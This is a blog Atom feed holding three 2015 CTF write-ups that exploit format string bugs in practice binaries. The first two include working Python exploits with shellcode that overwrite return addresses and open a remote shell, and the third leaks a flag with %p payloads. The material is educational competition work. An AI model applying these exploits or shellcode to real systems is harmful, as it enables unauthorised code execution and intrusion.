<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Fmt | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/fmt/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-05-18T21:46:21+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babyecho Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/"/>
    <updated>2015-05-18T21:45:44+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycho Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<blockquote><p>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</p></blockquote>

<pre><code>$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
$ checksec.sh --file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
</code></pre>

<p>First try got my attention:</p>

<pre><code>$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p
0xd0xa(nil)0xd
Reading 13 bytes
</code></pre>

<p>There is format string vulnerability, and based on binary properties we should run our shellcode.</p>

<p>but there&rsquo;s a limit, 13 bytes? right?</p>

<p>time to take a look at binary in IDA, the main function is <code>sub_8048F3C</code>.
some resolving symbols the function looks like this:</p>

<pre><code>int sub_8048F3C()
{
  signed int v0; // eax@2
  int v3; // [sp+10h] [bp-410h]@1
  int v4; // [sp+1Ch] [bp-404h]@4
  int v5; // [sp+41Ch] [bp-4h]@1

  v5 = *MK_FP(__GS__, 20);
  v3 = 13;
  setvbuf((int)off_80EA4C0, 0, 2, 0);
  signal(14, (int)sub_8048EB1);
  alarm(10);
  while ( 1 )
  {
    v0 = 1023;
    if ( v3 &lt;= 1023 )
      v0 = v3;
    v3 = v0;
    printf("Reading %d bytes\n", v0);
    reado((int)&amp;v4, v3, 10);
    filter_n((int)&amp;v4);
    printf((const char *)&amp;v4);
    alarm(10);
  }
}
</code></pre>

<p>the <code>filter_n</code> function just checks for <code>%n</code> and filters it as <code>_n</code>.</p>

<p>if i overwrite <code>v0</code> i can send my shellcode and return to it.</p>

<p>i just need to know the offset, and gdb says it is 7:</p>

<pre><code>Reading 13 bytes
%p%p%p%p
[-------------------------------------registers--------------------------------------]
EAX: 0xffffc86c ("%p%p%p%p")
EBX: 0x80481a8 (push   ebx)
ECX: 0x0 
EDX: 0xffffffff 
ESI: 0x0 
EDI: 0x80ea00c --&gt; 0x80660a0 (mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffcc78 --&gt; 0x80497d0 (push   ebx)
ESP: 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
EIP: 0x804900f (call   0x804f560)
[----------------------------------------code----------------------------------------]
   0x8049003:   call   0x8048ecf
   0x8049008:   lea    eax,[esp+0x1c]
   0x804900c:   mov    DWORD PTR [esp],eax
=&gt; 0x804900f:   call   0x804f560
   0x8049014:   mov    DWORD PTR [esp],0xa
   0x804901b:   call   0x804fde0
   0x8049020:   mov    DWORD PTR [esp],0x14
   0x8049027:   call   0x806cb50
Guessed arguments:
arg[0]: 0xffffc86c ("%p%p%p%p")
[---------------------------------------stack----------------------------------------]
00:0000| esp 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
01:0004|     0xffffc854 --&gt; 0xd (b'\r')
02:0008|     0xffffc858 --&gt; 0xa (b'\n')
03:0012|     0xffffc85c --&gt; 0x0 
04:0016|     0xffffc860 --&gt; 0xd (b'\r')
05:0020|     0xffffc864 --&gt; 0xffffc86c ("%p%p%p%p")
06:0024|     0xffffc868 --&gt; 0x0 
07:0028| eax 0xffffc86c ("%p%p%p%p")
[------------------------------------------------------------------------------------]
Legend: stack, code, data, heap, rodata, value

Breakpoint 2, 0x0804900f in ?? ()
</code></pre>

<p>Obviously, first i should leak the stack address at offset 5, then overwrite the <code>v0</code> so i send my shellcode, but the main part is how to break the loop. for this i just overwrite return address of <code>printf</code> and then jump to my shellcode.</p>

<p>TL;DR
Please check my implementation:</p>

<pre><code>#!/usr/bin/python

import socket
import struct
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) &gt; 0
        data += c
    #print data
    return data

def p(v):
    return struct.pack('&lt;I', v)

def u(v):
    return struct.unpack('&lt;I', v)[0]


#s = socket.create_connection(("127.0.0.1", 1337))
s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
f = s.makefile('rw', bufsize=0)

raw_input("$") # attach debugger


shellcode = (
"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
          "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
                  "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
        )

readuntil(f)
f.write("%p"*5+"\n")
loc =  int(readuntil(f)[:-1].split("0x")[-1], 16)  - 0x0c

readuntil(f)
f.write(p(loc)+"%30u%7$n\n")



readuntil(f)
f.write(p(loc)+"%1200u%7$n\n")

readuntil(f)

wrl = loc+100 &amp; 0xffff
wrh = (loc+100 &gt;&gt; 16 ) &amp; 0xffff

print hex(wrl), hex(wrh)

payload = p(loc-0x14)+"%0{i}c".format(i=wrl)+"%0007$hn"+"%0{i}c".format(i=(wrh-wrl-8))+p(loc-0x12)+"%0014$hn"+p(loc-0x12)+"A"*48+shellcode+"A"*(1024 - 48 - len(shellcode))+"\n"
print payload


f.write(payload)

print "[+] shell is ready: "
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>there you go:</p>

<pre><code>$ python babyecho-expl.py
0x4a24 0xffd2
�I��%018980c%0007$hn%046502c
[...]
cat /home/babyecho/flag 
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
</code></pre>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF CTF 2015 - EBP Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/"/>
    <updated>2015-04-20T22:40:13+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup</id>
    <content type="html"><![CDATA[<p><strong>PlaidCTF 2015 EBP Writeup</strong><br/>
<strong>Point = 160</strong><br/>
<strong>Category = Pwnable</strong></p>

<p>Unfortunately the CTF time for our team was completely under heavy pressure. but here is one i solved in my free time.</p>

<blockquote><p>Category: Pwnable Points: 160 Solves: 157 Description:
   nc 52.6.64.173 4545
   Download: %p%o%o%p.</p></blockquote>

<p>We are given an ELF file:</p>

<pre><code>$ file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
ebp_a96f7231ab81e1b0d7fe24d660def25a.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4e8094f9986968cd856db5093810badbb0749fde, not stripped
</code></pre>

<p>first attempt peresented us that it&rsquo;s a Format String Vulenrability.</p>

<pre><code>$ ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
%p%p%p%p%p
0xa0x10xf76c40000xffec67180x804852c
</code></pre>

<p>We noticed that the binary is provided with disabled NX.</p>

<!-- more -->


<pre><code>checksec.sh --file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ebp_a96f7231ab81e1b0d7fe24d660def25a.elf
</code></pre>

<p>So it was pretty simple to run our shellcode and execute proper command to read the flag.</p>

<p>It was the time to see the binary. IDA showed us that the buggy function is <code>make_response</code> since no FMT was used.</p>

<pre><code>int make_response()
{
  return snprintf(response, 0x400u, buf);
}
</code></pre>

<p>but <code>response</code> and <code>buf</code> are on <strong>BSS</strong> and we should change execution flow to this address <code>0x0804A480</code>.</p>

<p>By dumping stack on executing <code>make_response</code> we had these values:</p>

<pre><code>Breakpoint 1, 0x08048503 in make_response ()
gdb-peda$ x/64wx $esp
0xffffcc30:     0xf7fadc20      0x0804a080      0x000003ff      0x0000000a
0xffffcc40:     0x00000001      0xf7fad000      0xffffcc68      0x0804852c
0xffffcc50:     0xffffcc88      0xf7ff04b0      0xffffccb4      0xf7fad000
0xffffcc60:     0x00000000      0x00000000      0xffffcc88      0x08048557
0xffffcc70:     0x0804a080      0x00000400      0xf7fadc20      0xf7fad000
0xffffcc80:     0x08048580      0x00000000      0x00000000      0xf7e1da83
0xffffcc90:     0x00000001      0xffffcd24      0xffffcd2c      0xf7feac9a
0xffffcca0:     0x00000001      0xffffcd24      0xffffccc4      0x0804a01c
0xffffccb0:     0x08048278      0xf7fad000      0x00000000      0x00000000
0xffffccc0:     0x00000000      0xb9b964cc      0x8594c0dc      0x00000000
0xffffccd0:     0x00000000      0x00000000      0x00000001      0x08048400
0xffffcce0:     0x00000000      0xf7ff04b0      0xf7e1d999      0xf7ffd000
0xffffccf0:     0x00000001      0x08048400      0x00000000      0x08048421
0xffffcd00:     0x08048547      0x00000001      0xffffcd24      0x08048580
0xffffcd10:     0x080485f0      0xf7feb130      0xffffcd1c      0x0000001c
0xffffcd20:     0x00000001      0xffffcf57      0x00000000      0xffffcf96
</code></pre>

<p>You may notice that to overwriting a value via FMT vuln we should provide an address to <code>%n</code>. but we had just BSS variables so we should make this environment manually. As name of the challenge suggets we can use saved frame pointer since it has address of this frame. The scenario is pretty simple:</p>

<ol>
<li>leak an stack address to find location of RET address of current function <code>make_response</code>.</li>
<li>overwrite RET address in place of saved frame pointer (which ebp points to it).</li>
<li>again using a format string overwrite RET with <code>response</code> address.</li>
</ol>


<p>You should notice that we should write 2 least significant byte of ebp address location (%hhn).</p>

<p>TL;DR</p>

<p>This is what i used as exploiting this challenge:</p>

<pre><code>import socket
import struct
import telnetlib

response = 0x0804a480

offset = 4 # saved frame pointer offset 

shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php
    "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
        "\x73\x68\x68\x2f\x62\x69\x6e\x54"
        "\x5b\x52\x53\x54\x59\x0f\x34"
)

s = socket.create_connection(("52.6.64.173", 4545 ))
#s = socket.create_connection(("127.0.0.1", 8080 ))
s.send("%4$p\n")
addr = int(s.recv(1024), 16)
print "[+] Leaked Address: ", hex(addr)
addr1 = (addr - 0x1c) &amp; 0xffff
print "[+] 2Byte Significant Byte to write : ", hex(addr1) 

s.send("%"+str(addr1)+"x%"+str(offset)+"$hn\n")
s.recv(4096)

s.send(shellcode+"%"+str((response &amp; 0xffff)-len(shellcode))+"x%"+str(12)+"$hn\n")
print "[+] Here you go"
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>running the exploit we have:</p>

<pre><code>$ python ebp-exploit.py 
[+] Leaked Address:  0xffbea7c8
[+] 2Byte Significant Byte to write :  0xa7ac
[+] Here you go
cat /home/problem/flag.txt
who_needs_stack_control_anyway?
</code></pre>

<p>So we&rsquo;ve got 160 point.</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - TEAM Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/"/>
    <updated>2015-04-03T03:16:39+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 TEAM Writeup</strong><br/>
<strong>Point = 600</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.</p></blockquote>

<pre><code>$ file team
team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
$ checksec.sh --file team
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team
</code></pre>

<p>Ok looking into the binary in IDA shows us two function <code>0x08048769</code> and <code>0x080486ad</code> are important to us. the first one can be seen bellow:</p>

<!--more-->


<pre><code>int sub_8048769()
{
  const char *v0; // ST18_4@1
  const char *v1; // ST1C_4@1

  v0 = (const char *)malloc(0xC8u);
  v1 = (const char *)malloc(0x64u);
  printf("Enter teamname: ");
  fflush(stdout);
  __isoc99_scanf("%200s", v0);
  printf("Enter flag: ");
  fflush(stdout);
  __isoc99_scanf("%100s", v1);
  sleep(2u);
  sub_80486AD(v0, v1);
  free((void *)v0);
  free((void *)v1);
  return 0;
}
</code></pre>

<p>As you can see there is no potential flaw so we skip to second one:</p>

<pre><code>signed int __cdecl sub_80486AD(const char *a1, const char *a2)
{
  signed int result; // eax@2
  int v3; // edx@7
  FILE *stream; // [sp+24h] [bp-74h]@1
  char s; // [sp+28h] [bp-70h]@3
  int v6; // [sp+8Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    fgets(&amp;s, 100, stream);
    printf(a1);
    if ( !strcmp(&amp;s, a2) )
      puts(" : correct flag!");
    else
      puts(" : incorrect flag. Try again.");
    fclose(stream);
    result = 0;
  }
  else
  {
    result = 1;
  }
  v3 = *MK_FP(__GS__, 20) ^ v6;
  return result;
}
</code></pre>

<p>interesting! in this function flag.txt will be opened and read but the important part is <code>printf(a1);</code>. remember previous function <code>a1</code> is the <code>v0</code> var which have the teamname! So there is a <em>Format String Vulnerability</em>. And the abuse is pretty simple, just printing the stack addresses to leak the flag:</p>

<pre><code>$ cat 5
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
A

$ cat 5 | nc hack.bckdr.in 8004
Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.
</code></pre>

<p>you can see that
<code>
0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137
</code>
is our flag. using python <code>struct</code> module for all gives us this one:</p>

<pre><code>[redacted]
</code></pre>

<p>which added 600pts to our points.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
</feed>
